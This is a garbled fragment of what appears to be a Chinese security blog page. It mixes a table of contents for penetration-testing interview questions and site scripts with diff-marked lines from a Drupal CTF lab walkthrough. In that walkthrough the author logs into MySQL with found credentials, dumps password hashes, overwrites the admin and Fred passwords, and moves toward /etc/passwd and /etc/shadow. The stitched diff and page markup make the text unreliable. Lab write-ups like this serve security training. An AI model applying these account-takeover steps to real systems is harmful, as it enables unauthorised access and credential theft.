href="#43-python%E5%B8%B8%E7%94%A8%E7%9A%84%E6%A0%87%E5%87%86%E5%BA%93"><span class="toc-text">43.python常用的标准库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#44-reverse-tcp-%E5%92%8C-bind-tcp-%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-text">44.reverse_tcp 和 bind_tcp 的区别？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#45-oauth%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E4%B8%AD%E5%8F%AF%E8%83%BD%E4%BC%9A%E5%87%BA%E7%8E%B0%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%EF%BC%8C%E5%AF%BC%E8%87%B4%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-text">45.oauth认证过程中可能会出现什么问题，导致什么样的漏洞?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#46-%E5%81%9A%E4%BA%86cdn%E7%9A%84%E7%BD%91%E7%AB%99%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9EIP"><span class="toc-text">46.做了cdn的网站如何获取真实IP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#47-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E8%B7%A8%E5%9F%9F%EF%BC%9F"><span class="toc-text">47.如何实现跨域？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#48-jsonp%E8%B7%A8%E5%9F%9F%E4%B8%8ECORS%E8%B7%A8%E5%9F%9F%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-text">48.jsonp跨域与CORS跨域的区别？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#49-SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9F"><span class="toc-text">49.SSRF漏洞利用？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#50-%E5%B8%B8%E8%A7%81%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-text">50.常见后门方式？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#51-open-basedir%E8%AE%BF%E9%97%AE%E7%9B%AE%E5%BD%95%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="toc-text">51.open_basedir访问目录限制绕过方法？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#52-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E5%AE%B9%E6%98%93%E5%87%BA%E9%97%AE%E9%A2%98%E7%9A%84%E7%82%B9%EF%BC%9F"><span class="toc-text">52.PHP代码审计中容易出问题的点？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#53-%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%AD%E8%93%9D%E9%98%9F%E5%8F%8D%E6%9D%80%E7%BA%A2%E9%98%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E5%A7%BF%E5%8A%BF%EF%BC%9F"><span class="toc-text">53.红蓝对抗中蓝队反杀红队场景和姿势？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#54-linux%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%EF%BC%8C%E9%BB%91%E5%AE%A2%E9%9A%90%E8%97%8F%E8%87%AA%E5%B7%B1%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E4%BC%9A%E6%80%8E%E4%B9%88%E5%81%9A%EF%BC%9F"><span class="toc-text">54.linux计划任务，黑客隐藏自己的计划任务会怎么做？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#55-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%B8%B8%E8%A7%81getshell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-text">55.Redis未授权常见getshell的几种方式？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#56-JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%EF%BC%9F%EF%BC%88%E5%A4%B4%E9%83%A8%E3%80%81%E8%B4%9F%E8%BD%BD%E3%80%81%E7%AD%BE%E5%90%8D%EF%BC%89"><span class="toc-text">56.JWT的攻击手法？（头部、负载、签名）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#57-JAVA%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%B8%BE%E5%87%A0%E4%B8%AA%E4%BE%8B%E5%AD%90%EF%BC%9F"><span class="toc-text">57.JAVA中间件的漏洞，举几个例子？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#58-DNS%E5%A4%96%E5%B8%A6%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%9C%A8%E5%93%AA%E4%BA%9B%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-text">58.DNS外带可以用在哪些漏洞？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#59-HTTP-Only%E7%A6%81%E6%AD%A2%E7%9A%84%E6%98%AFJS%E8%AF%BB%E5%8F%96cookie%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E8%BF%99%E4%B8%AA%E8%8E%B7%E5%8F%96cookie"><span class="toc-text">59.HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#60-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%EF%BC%9F"><span class="toc-text">60.中间件漏洞总结？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#61-%E8%B0%88%E4%B8%80%E8%B0%88Windows%E7%B3%BB%E7%BB%9F%E4%B8%8ELinux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83%E7%9A%84%E6%80%9D%E8%B7%AF%EF%BC%9F"><span class="toc-text">61.谈一谈Windows系统与Linux系统提权的思路？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#62-python%E6%9C%89%E5%93%AA%E4%BA%9B%E6%A1%86%E6%9E%B6%EF%BC%8C%E5%85%B6%E4%B8%AD%E5%87%BA%E7%8E%B0%E8%BF%87%E5%93%AA%E4%BA%9B%E6%BC%8F%E6%B4%9E"><span class="toc-text">62.python有哪些框架，其中出现过哪些漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#63-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B8%97%E9%80%8F%E5%92%8C%E6%99%AE%E9%80%9A%E6%B8%97%E9%80%8F%E7%9A%84%E5%B7%AE%E5%BC%82"><span class="toc-text">63.小程序的渗透和普通渗透的差异</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64-app%E6%9C%AC%E8%BA%AB%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6"><span class="toc-text">64.app本身的漏洞测试 四大组件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#65-IDS-IPS%E9%98%B2%E6%8A%A4%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="toc-text">65.IDS&#x2F;IPS防护原理及绕过思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#66-json%E7%9A%84csrf%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">66.json的csrf的利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#67-json%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85%E5%8F%AF%E4%BB%A5%E6%B5%8B%E5%93%AA%E4%BA%9B%E6%BC%8F%E6%B4%9E"><span class="toc-text">67.json格式的数据包可以测哪些漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#68%E3%80%81%E7%AE%80%E8%BF%B0xxe%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">68、简述xxe漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#69-%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%9F"><span class="toc-text">69.内网服务器，如何进行信息收集？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#70-%E5%A6%82%E6%9E%9C%E6%8B%BF%E4%B8%8B%E4%BA%86%E5%86%85%E7%BD%91%E8%BE%B9%E7%95%8C%E5%B1%82%E7%9A%84%E6%9F%90%E4%B8%80%E4%B8%AA%E6%9C%BA%E5%99%A8%EF%BC%8C%E5%A6%82%E4%BD%95%E5%AF%B9%E5%86%85%E7%BD%91%E5%85%B6-%E4%BB%96%E8%BF%9B%E8%A1%8C%E6%8E%A2%E6%B5%8B%EF%BC%9F"><span class="toc-text">70.如果拿下了内网边界层的某一个机器，如何对内网其 他进行探测？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#71-%E4%BB%80%E4%B9%88%E6%97%B6SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-text">71.什么时SQL注入攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#72-%E4%BB%80%E4%B9%88%E6%98%AFXSS%E6%94%BB%E5%87%BB"><span class="toc-text">72.什么是XSS攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#73-%E4%BB%80%E4%B9%88%E6%98%AFCSRF%E6%94%BB%E5%87%BB"><span class="toc-text">73.什么是CSRF攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#74-%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-text">74.什么是文件上传漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#75-DDos-%E6%94%BB%E5%87%BB"><span class="toc-text">75.DDos 攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#76-%E9%87%8D%E8%A6%81%E5%8D%8F%E8%AE%AE%E5%88%86%E5%B8%83%E5%9B%BE"><span class="toc-text">76.重要协议分布图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#77-arp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-text">77.arp协议的工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#78-%E4%BB%80%E4%B9%88%E6%98%AFRARP%EF%BC%9F%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-text">78.什么是RARP？工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#79-dns%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9Fdns%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-text">79.dns是什么？dns的工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#80-rip%E5%8D%8F%E8%AE%AE%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9Frip%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-text">80.rip协议是什么？rip的工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#81-RIP%E7%9A%84%E7%BC%BA%E7%82%B9"><span class="toc-text">81.RIP的缺点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#82-OSPF%E5%8D%8F%E8%AE%AE%EF%BC%9F-OSPF%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-text">82.OSPF协议？ OSPF的工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#83-TCP%E4%B8%8EUDP%E5%8C%BA%E5%88%AB%E6%80%BB%E7%BB%93"><span class="toc-text">83.TCP与UDP区别总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#84-%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B%EF%BC%9Ftcp%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%EF%BC%9F"><span class="toc-text">84.什么是三次握手四次挥手？tcp为什么要三次握手？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#85-GET-%E5%92%8C-POST-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">85.GET 和 POST 的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#86-Cookies%E5%92%8Csession%E5%8C%BA%E5%88%AB"><span class="toc-text">86.Cookies和session区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#87-session-%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%9F"><span class="toc-text">87.session 的工作原理？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#88-%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84HTTP%E8%AF%B7%E6%B1%82%E8%BF%87%E7%A8%8B"><span class="toc-text">88.一次完整的HTTP请求过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#89-HTTPS%E5%92%8CHTTP%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">89.HTTPS和HTTP的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#90-OSI-%E7%9A%84%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-text">90.OSI 的七层模型都有哪些？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#91-http%E9%95%BF%E8%BF%9E%E6%8E%A5%E5%92%8C%E7%9F%AD%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">91.http长连接和短连接的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#92-%E4%BB%80%E4%B9%88%E6%98%AFTCP%E7%B2%98%E5%8C%85-%E6%8B%86%E5%8C%85%EF%BC%9F-%E5%8F%91%E7%94%9F%E5%8E%9F%E5%9B%A0%EF%BC%9F%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-text">92.什么是TCP粘包&#x2F;拆包？ 发生原因？解决方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#93-TCP%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%EF%BC%9F"><span class="toc-text">93.TCP如何保证可靠传输？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#94-%E5%B8%B8%E8%A7%81%E7%9A%84%E7%8A%B6%E6%80%81%E7%A0%81%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-text">94.常见的状态码有哪些？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#95-%E4%BB%80%E4%B9%88%E6%98%AFSSL-%EF%BC%9Fhttps%E6%98%AF%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E7%9A%84%E5%AE%89%E5%85%A8%EF%BC%88SSL%E6%98%AF%E6%80%8E%E4%B9%88%E5%B7%A5%E4%BD%9C-%E4%BF%9D%E8%AF%81%E5%AE%89%E5%85%A8%E7%9A%84%EF%BC%89"><span class="toc-text">95.什么是SSL ？https是如何保证数据传输的安全（SSL是怎么工作 保证安全的）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#96-%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E5%85%AC%E9%92%A5%E4%B8%8D%E8%A2%AB%E7%AF%A1%E6%94%B9"><span class="toc-text">96.如何保证公钥不被篡改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#97-%E7%AE%97%E6%B3%95%EF%BC%9F%E4%BA%86%E8%A7%A3%E8%BF%87%E4%BB%80%E4%B9%88%E6%8E%92%E5%BA%8F%EF%BC%9F"><span class="toc-text">97.算法？了解过什么排序？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#98-%E6%8F%8F%E8%BF%B0%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9%E7%9A%84%E6%B5%81%E7%A8%8B%EF%BC%9F"><span class="toc-text">98.描述外网打点的流程？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#99-%E4%B8%BE%E5%87%A0%E4%B8%AA-FOFA-%E5%9C%A8%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7%EF%BC%9F"><span class="toc-text">99.举几个 FOFA 在外网打点过程中的使用小技巧？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#100-%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB-CND%EF%BC%9F"><span class="toc-text">100.如何识别 CND？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#101-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E7%9A%84%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-text">101.邮件钓鱼的准备工作有哪些?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#102-%E5%88%A4%E6%96%AD%E5%87%BA%E9%9D%B6%E6%A0%87%E7%9A%84-CMS%EF%BC%8C%E5%AF%B9%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9%E6%9C%89%E4%BB%80%E4%B9%88%E6%84%8F%E4%B9%89%EF%BC%9F"><span class="toc-text">102.判断出靶标的 CMS，对外网打点有什么意义？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#103-Apache-Log4j2-%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">103.Apache Log4j2 的漏洞原理是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#104-%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB%E5%92%8C%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">104.水坑攻击和鱼叉攻击的区别是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#105-%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E9%9D%B6%E6%A0%87%E7%AB%99%E7%82%B9%E6%98%AF-windows-linux"><span class="toc-text">105.如何判断靶标站点是 windows&#x2F;linux</span></a></li></ol></li></ol></div><div class="widget-footer">
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWI3NDJmM2Q3NWVjOWZlN2E1Mjg4NGU3NGVlYzJkNzRfMzZsYkhWVkpGUGZCUnJ1ODVxbmdhTzNRMlFBYW9PbWRfVG9rZW46UTB3Y2J2S1Exb0M1bVF4dkYxR2NLVDZWbmhiXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>接着使用该数据库，并查看表 <code>use drupaldb;show tables;</code></p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc4ZGE4MTEwMDUwNTA3OWIyNzI5ZGY1YjUxNTlkZWVfOXFqSzBRWGEyYXV5b05WekNUdHZ4ZWxyU0RJYzNNV3BfVG9rZW46RllLemJUVE11bzRzbEp4WE5ZSWNhbEs1bkVmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>注意到users这个表，看一下有啥，先改小一点字体，不然可能会挤爆不美观</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NDA1MWNhOGM4NzU4ZjdjZTMxMmNmOGZkMGYyNGZmYjFfYkhuTWo4NXk0bkg4dVl0bFM4cVBvMWprMHNPblA4bnlfVG9rZW46R0tUT2I5dk1qb0F3UmZ4SUdJVmM0UlF2bldDXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>得到两个用户</p>
-<p>1 | admin | S SSDvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</p>
-<p>2 | Fred | S SSDWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ&#x2F;9TCGg</p>
-<p>密码好复杂，应该不是明文，那想登进后台就很难了就很难了，我们可以通过修改admin的密码，或者是新加一个admin</p>
-<p><strong>方法一：修改admin密码</strong></p>
-<p>我们得先找到加密文件，Drupal的加密脚本在</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/scripts/password-hash.sh</span><br></pre></td></tr></table></figure>
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
 
-<p>首先我推出mysql</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit;</span><br></pre></td></tr></table></figure>
+</script>
 
-<p>打开加密脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/www/scripts/password-hash.sh</span><br></pre></td></tr></table></figure>
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=OGY0YzgyNjcwNDVjYWUxNmFiODk5YTNiZjRmMjJkMjhfYjZzbnc4WFlvb2pENDlyU3lXajJIUHNMSVE3YzlRTVhfVG9rZW46UVFLOGJjQ3Zzb0x2NW54dDdGcWNhYmpLbnNlXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>这个脚本是用php写的，而且还能用php加参数运行，直接得到加密后的密码，这里我们设置一个密码123456</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php /var/www/scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure>
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YWYzYTY4ZmM3MWY5ZjUwOTUwOWJjZTkxYzQxNjZjNzNfZWFIenJyZ2dUa0s1a0t6QXpkY1FLTGZoRzJSWlhQbkRfVG9rZW46UHlsWGJ2czl0b3RnMmF4MlA0Z2NkdjRrblRiXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>得到加密后的密码， 接着我们登入mysql修改一下admin跟Fred的密码</p>
-<p>mysql -udbuser -pR0ck3t</p>
-<p>use drupaldb;update users set pass &#x3D; “S SSD1UQvb3x7lKoCSX6S9K.r.wB202Lsa&#x2F;r7fkOj7CelJsSEMFDJjGv” where name &#x3D; ‘admin’ or name &#x3D; ‘Fred’;</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NGJmMDU4NTRkMGQ0ODI3ZGJiYWEzNjliMWVhZmQ4ZGFfdTgyOUFJS2ROWkRrOHpUMUpoR0cwdVlqTjFXcEpCazBfVG9rZW46SE5wMmJZTVdMb0ZMVDV4MWVVQmMyTnZvbnJlXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>接着我们用修改好的密码登入</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmNlYzUyMzI0MDY3MzI3MDAxOTA0MDUzMzMxNjUwZWNfVGphTEdkeDdLTHlJc09mTk1tSDFIenYyZmtLT1pQNVdfVG9rZW46QVNJbmJmclNVb3RnVGx4NGtLZGM5WUp3bmdlXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>登进去就找到了flag3，提示了我们一些信息passwd和shadow，明显就是linux的文件</p>
-<p>&#x2F;etc&#x2F;passwd</p>
-<p>该文件存储了系统用户的基本信息，所有用户都可以对其进行文件操作读</p>
-<p>Linux &#x2F;etc&#x2F;passwd内容解释（超详细）</p>
-<p>&#x2F;etc&#x2F;shadow</p>
